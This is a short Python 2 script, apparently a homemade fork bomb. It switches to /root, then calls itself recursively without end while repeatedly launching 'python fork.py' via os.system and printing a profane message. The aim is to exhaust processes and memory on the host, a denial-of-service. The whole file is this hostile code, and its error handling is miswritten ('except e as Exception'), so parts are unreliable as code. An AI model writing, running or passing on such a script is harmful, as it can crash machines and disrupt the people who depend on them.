#!/usr/bin/env python
import sys
import os

def run():
    a = "python fork.py"
    os.system(a)
    os.system("echo 'FORKIN IT FUCK YEH'")
    run()
def fork():

    current_path = os.getcwd()
    if current_path != "/root":
        try:
            os.chdir("/root")
            current_path = os.getcwd()
            print "[r] Directory has been changed to root."
            run()
        except e as Exception:
            print "Cannot go to root directory"
    else:
        run()
def main():fork()
if __name__ == "__main__":
    main()
